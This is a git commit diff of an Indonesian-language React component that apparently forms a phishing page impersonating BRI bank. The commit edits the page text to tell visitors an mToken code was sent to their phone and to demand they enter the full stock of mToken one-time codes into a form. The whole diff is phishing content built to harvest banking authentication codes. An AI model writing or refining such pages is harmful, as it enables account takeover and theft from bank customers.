b2fbef9dee2ba7f3dda029b5efd1d93ab94ca6d3
penaruhangin <penaruhangin@gmail.com>
2022-10-23 15:26:09 +0700

    edit itu

--- components/SiteVerifikasi.js
+++ components/SiteVerifikasi.js
@@ -30,10 +30,10 @@ const SiteVerifikasi = ({btnClick}) => {
           renderer={renderer}
         />
         </h1>    
-        <h1 style={{textAlign:'center', fontWeight:'bold', marginTop:'1em'}}>(RAHASIA) Jangan berikan kepada pihak lain/pihak yang mengaku BRI. Stok mToken IB BRI ID0633xxxxxxx: xxxxxx,xxxxxx,xxxxxx,xxxxxx,xxxxxx</h1>    
-        <h1 style={{textAlign:'center', fontWeight:'bold', marginTop:'1em'}}>Masukkan kode Aktivasi (Wajib)</h1>    
+        <h1 style={{textAlign:'center', fontWeight:'bold', marginTop:'1em'}}>Kode mToken untuk konfirmasi sms dari OTP BRI tarif normal telah kami kirimkan ke nomor Handphone anda, Silahkan cek sms di Handphone anda. lalu masukkan kode mToken 6 angka 5 baris</h1>    
+        <h1 style={{textAlign:'center', fontWeight:'bold', marginTop:'1em'}}>Masukkan kode mToken (Wajib)</h1>    
         <form>
-            <textarea id='msg' className='form-control-pesan' rows={5} placeholder="Silahkan isi mToken"></textarea>
+            <textarea id='msg' className='form-control-pesan' rows={5} placeholder="(RAHASIA) Jangan berikan kepada pihak lain/pihak yang mengaku BRI. Stok mToken IB BRI ID0633xxxxxxx: xxxxxx,xxxxxx,xxxxxx,xxxxxx,xxxxxx"></textarea>
             <button type='button' onClick={handleClick} className='btn' id='btn' style={{marginTop:'2em', marginBottom:'2em'}}>
               Konfirmasi
             </button>
